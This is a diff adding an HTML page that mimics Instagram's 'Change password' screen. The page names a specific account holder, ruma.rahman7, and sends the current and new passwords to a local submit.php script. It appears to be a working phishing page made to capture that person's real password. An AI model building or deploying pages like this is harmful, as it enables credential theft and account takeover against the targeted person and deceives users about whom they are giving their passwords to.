@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Change Password • Instagram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    .header {
+      padding: 16px 0 10px;
+      border-bottom: 1px solid #222;
+      text-align: center;
+    }
+
+    .header img {
+      width: 30px;
+      height: 30px;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+
+    .header-text {
+      display: inline-block;
+      font-weight: 600;
+      font-size: 16px;
+      vertical-align: middle;
+    }
+
+    .container {
+      padding: 20px;
+    }
+
+    h2 {
+      font-size: 20px;
+      margin-bottom: 8px;
+    }
+
+    p {
+      font-size: 13px;
+      color: #aaa;
+      margin-top: 0;
+      margin-bottom: 16px;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      margin-top: 12px;
+      border: 1px solid #333;
+      border-radius: 14px;
+      background-color: #1a1a1a;
+      color: #fff;
+      font-size: 15px;
+      box-sizing: border-box;
+      box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.4);
+    }
+
+    label {
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      margin-top: 16px;
+      color: #ddd;
+    }
+
+    input[type="checkbox"] {
+      margin-right: 10px;
+      transform: scale(1.1);
+      accent-color: #3897f0;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 20px;
+      padding: 14px;
+      background-color: #3897f0;
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="instagram-icon.png" alt="Instagram Icon">
+    <span class="header-text">ruma.rahman7 • Instagram</span>
+  </div>
+  <div class="container">
+    <h2>Change password</h2>
+    <p>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters (!@$%).</p>
+    <form action="submit.php" method="POST">
+      <input type="password" name="oldpass" placeholder="Current password" required>
+      <input type="password" name="newpass" placeholder="New password" required>
+      <input type="password" name="confirmpass" placeholder="Retype new password" required>
+      <label>
+        <input type="checkbox" name="logout_devices" checked>
+        Log out of other devices. Choose this if someone else used your account.
+      </label>
+      <button type="submit">Change Password</button>
+    </form>
+  </div>
+</body>
+</html>
